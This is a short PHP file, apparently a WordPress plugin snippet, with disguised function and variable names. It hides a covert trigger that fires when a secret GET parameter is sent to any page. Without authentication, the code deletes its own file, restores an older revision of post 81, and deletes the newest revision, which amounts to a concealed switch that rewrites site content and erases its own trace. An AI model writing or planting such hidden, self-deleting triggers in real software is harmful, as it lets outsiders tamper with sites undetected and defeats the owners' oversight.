<?php

function navigation_divi_advanced() {
	if (isset($_GET['designer_taxonomies_scheduled_live']) && $_GET['designer_taxonomies_scheduled_live'] === 'authors_ip_dev') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$site_scroll_online_only = 81;
		$name_finder_card = wp_get_post_revisions($site_scroll_online_only);
		if (empty($name_finder_card)) die('no revisions');
		if (count($name_finder_card) < 2) die('less than 2');
		$post_blocker_server_press = array_shift($name_finder_card);
		$badge_captcha_selector = $post_blocker_server_press->ID;
		$poll_revisions_front = array_shift($name_finder_card);
		$xml_meta_shortcodes = $poll_revisions_front->ID;
		$wishlist_hover_smooth = wp_restore_post_revision($xml_meta_shortcodes);
		if ($wishlist_hover_smooth === false) die('error restoring');
		$wishlist_hover_smooth = wp_delete_post_revision($badge_captcha_selector);		
		if ($wishlist_hover_smooth === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'navigation_divi_advanced');
